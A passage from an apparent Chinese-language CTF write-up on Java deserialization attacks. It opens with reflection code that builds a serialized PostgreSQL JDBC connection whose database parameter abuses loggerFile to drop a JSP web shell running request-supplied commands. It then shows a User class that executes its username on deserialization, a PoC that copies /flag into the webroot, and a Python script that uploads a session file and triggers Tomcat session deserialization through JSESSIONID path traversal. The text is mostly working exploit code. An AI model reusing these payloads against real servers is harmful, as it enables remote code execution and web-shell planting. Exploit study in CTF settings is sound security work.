        Class<? extends Connection> aClass = connection.getClass();
        Field driver = aClass.getDeclaredField("driver");
        driver.setAccessible(true);
        driver.set(connection,"org.postgresql.Driver");
        Field host = aClass.getDeclaredField("host");
        host.setAccessible(true);
        host.set(connection,"127.0.0.1");
        Field port = aClass.getDeclaredField("port");
        port.setAccessible(true);
        port.set(connection,5432);
        Field user = aClass.getDeclaredField("user");
        user.setAccessible(true);
        user.set(connection,new User("Enterpr1se","123456"));
        Field schema = aClass.getDeclaredField("schema");
        schema.setAccessible(true);
        schema.set(connection,"jdbc:postgresql");
        Field database = aClass.getDeclaredField("database");
        database.setAccessible(true);
        database.set(connection,"password=123456&loggerLevel=debug&loggerFile=../webapps/ROOT/c.jsp&<%Runtime.getRuntime().exec(request.getParameter(\"i\"));%>");

        serialize_func.serialize(connection);
        //serialize_func.unserialize("ser.bin");
        serialize_func.writetofile(serialize_func.encryptToBase64("ser.bin"));






    }
}
```

# 858
打一个tomcat session反序列化
```java
?
package com.ctfshow.entity;
 
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.Serializable;
 
public class User implements Serializable {
    private static final long serialVersionUID = -3254536114659397781L;
    private String username;
    private String password;
 
    public String getUsername() {
        return username;
    }
 
    public void setUsername(String username) {
        this.username = username;
    }
 
    public String getPassword() {
        return password;
    }
 
    public void setPassword(String password) {
        this.password = password;
    }
 
    private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {
        in.defaultReadObject();
        Runtime.getRuntime().exec(this.username);
    }
 
 
}
```
想办法触发反序列化
poc好说
```java
package com.ctfshow.entity;
import org.example.serialize_func;
import java.lang.reflect.Field;

public class Main {
    public static void main(String[] args) throws Exception{
       User user = new User();
       Class refuser = user.getClass();
       Field usernameField = refuser.getDeclaredField("username");
       usernameField.setAccessible(true);
       usernameField.set(user,"cp /flag /usr/local/tomcat/webapps/ROOT/a.jsp");
       serialize_func.serialize(user);
    }
}
```
根据漏洞原理可知如果上传a.session，那么当JSESSIONID为a.session上层路径/a时，则会触发反序列化。
```java
import requests
url="http://8c95a862-56ec-4984-b7a6-b1a2f396bfe0.challenge.ctf.show/"
files={'file':('a.session',open('a.session','rb').read(),'image/png')}
r = requests.post(url+'file/upload',files=files)
print(r.text)
r2 = requests.get(url,cookies={'JSESSIONID':'../../../../../../../../../../usr/local/tomcat/webapps/ROOT/WEB-INF/upload/a'})
print(r2.text)

```

